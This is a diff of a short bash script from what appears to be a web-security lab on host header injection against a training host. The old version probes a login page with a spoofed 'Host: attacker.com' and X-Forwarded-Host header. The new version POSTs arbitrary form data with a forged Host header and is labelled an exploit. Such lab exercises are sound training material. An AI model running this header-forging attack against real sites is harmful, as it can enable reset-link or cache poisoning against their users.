@@ -1,17 +1,18 @@
 #!/usr/bin/env bash
-# 1-host_header_injection.sh
-# Simple Host Header Injection checks against web0x00.hbtn.
-# Usage: ./1-host_header_injection.sh [base_url]
-# Example: ./1-host_header_injection.sh http://web0x00.hbtn
+# Exploit Host Header Injection using curl.
+# Usage: ./1-host_header_injection.sh <NEW_HOST> <TARGET_URL> <FORM_DATA>
 
-base_url="${1:-http://web0x00.hbtn}"
-endpoint="/login"
+new_host="$1"
+target_url="$2"
+form_data="$3"
 
-echo "[*] Host header injection test (Host: attacker.com)"
-curl -sS -i --max-time 5 -H "Host: attacker.com" "${base_url}${endpoint}" \
-  | sed -n '1,25p' || echo "[-] curl failed (check VPN + /etc/hosts entry)"
+if [ -z "$new_host" ] || [ -z "$target_url" ] || [ -z "$form_data" ]; then
+  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>" >&2
+  exit 1
+fi
 
-echo
-echo "[*] X-Forwarded-Host test (X-Forwarded-Host: attacker.com)"
-curl -sS -i --max-time 5 -H "Host: web0x00.hbtn" -H "X-Forwarded-Host: attacker.com" \
-  "${base_url}${endpoint}" | sed -n '1,25p' || echo "[-] curl failed (check VPN + /etc/hosts entry)"
+curl -sS -X POST \
+  -H "Host: $new_host" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "$form_data" \
+  "$target_url"
